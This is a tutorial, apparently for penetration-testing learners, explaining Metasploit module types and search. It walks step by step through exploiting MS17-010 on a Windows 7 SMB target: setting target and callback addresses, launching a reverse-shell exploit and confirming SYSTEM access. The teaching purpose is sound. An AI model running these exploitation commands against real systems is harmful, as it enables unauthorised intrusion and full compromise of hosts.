
## Metasploit Modules – Complete Breakdown

Metasploit modules are **pre-written, tested scripts** designed to perform a specific task during a penetration test. These scripts are based on **real-world proof-of-concept (PoC) exploits**, scanners, payloads, and post-exploitation techniques.

### Very important mindset

If a Metasploit exploit **fails**, it does **not** mean:

* The vulnerability does not exist
  It only means:
* The **Metasploit implementation** did not work for that specific environment

Many exploits require:

* Correct target version
* Proper configuration
* Manual customization
* Specific timing or prerequisites

Metasploit is a **support tool**, not a replacement for manual exploitation skills.

---

## Module Naming Structure

Each module follows this structure:

```
<type>/<os>/<service>/<name>
```

### Example

```
exploit/windows/ftp/scriptftp_list
```

When searching, Metasploit assigns an **index number**:

```
794 exploit/windows/ftp/scriptftp_list
```

That number allows you to load the module quickly using:

```
use 794
```

---

## Module Types (Most Important Section)

### 1. Auxiliary

Used for **supporting actions**, not direct exploitation.

Examples:

* Port scanning
* Vulnerability detection
* Service enumeration
* Admin actions

Does not usually provide a shell.

---

### 2. Exploits

Used to **exploit vulnerabilities** and deliver payloads.

Purpose:

* Trigger a vulnerability
* Gain code execution
* Launch payloads (shells, Meterpreter)

This is the most commonly used module type.

---

### 3. Payloads

Code that runs **after exploitation**.

Purpose:

* Open a shell
* Create reverse/bind connections
* Establish Meterpreter sessions

Payloads **do nothing by themselves**.
They must be delivered by an exploit.

---

### 4. Encoders

Used to **encode payloads**.

Purpose:

* Avoid bad characters
* Bypass basic signature detection
* Ensure payload arrives intact

Encoders do **not** provide evasion against modern AV alone.

---

### 5. NOPs

No Operation instructions.

Purpose:

* Pad payload size
* Maintain memory alignment
* Improve exploit reliability

Used internally, rarely touched manually.

---

### 6. Post

Used **after access is gained**.

Purpose:

* Privilege escalation
* Credential dumping
* System enumeration
* Pivoting

Requires an active session.

---

### 7. Plugins

Extend msfconsole functionality.

Examples:

* Database tracking
* Automation
* External tool integration

---

## Which Modules Can Be “Used”?

Only these module types are **interactable**:

| Type      | Can Be Used |
| --------- | ----------- |
| Auxiliary | Yes         |
| Exploit   | Yes         |
| Post      | Yes         |
| Payload   | No          |
| Encoder   | No          |
| NOP       | No          |

---

## Searching for Modules

Metasploit has a **powerful search engine**.

### Basic search

```bash
search eternalromance
```

### Filter by type

```bash
search eternalromance type:exploit
```

### Advanced search

```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

You can filter by:

* CVE
* Platform
* Rank
* Type
* Port
* Architecture
* Disclosure date

---

## Real Example: MS17-010 (EternalRomance)

### Step 1: Identify service

From Nmap:

* SMB on port 445
* Windows 7 detected

---

### Step 2: Search exploit

```bash
search ms17_010
```

Relevant results:

* exploit/windows/smb/ms17_010_psexec
* auxiliary/scanner/smb/smb_ms17_010

---

### Step 3: Select module

```bash
use 0
```

Or explicitly:

```bash
use exploit/windows/smb/ms17_010_psexec
```

---

## Viewing Module Options

```bash
options
```

Anything marked **Required: yes** must be set before running.

Common required options:

* RHOSTS (target IP)
* LHOST (attacker IP)
* LPORT (listening port)

---

## Getting Module Details

```bash
info
```

Shows:

* Vulnerability description
* Supported targets
* CVEs
* Reliability rank
* Payload size limits
* References

This is critical before exploitation.

---

## Setting Targets

### Temporary

```bash
set RHOSTS 10.10.10.40
```

### Permanent (until restart)

```bash
setg RHOSTS 10.10.10.40
```

Use `setg` when working on the same host repeatedly.

---

## Setting Callback Address (Reverse Shell)

```bash
setg LHOST 10.10.14.15
```

This is **mandatory** for reverse payloads.

---

## Launching the Exploit

```bash
run
```

or

```bash
exploit
```

If successful:

* A session opens
* Meterpreter or command shell is created

---

## Interacting with the Target

```bash
meterpreter > shell
```

Then:

```bash
whoami
```

Example result:

```
nt authority\system
```

This confirms **SYSTEM-level access**, the highest privilege on Windows.

---

## Key Takeaways

* Metasploit exploits ≠ guaranteed success
* Always enumerate before exploiting
* Understand the module before running it
* Required options must be set correctly
* `info` is your best friend
* Metasploit accelerates exploitation, it does not replace skill
* One correct module can fully compromise a system

---


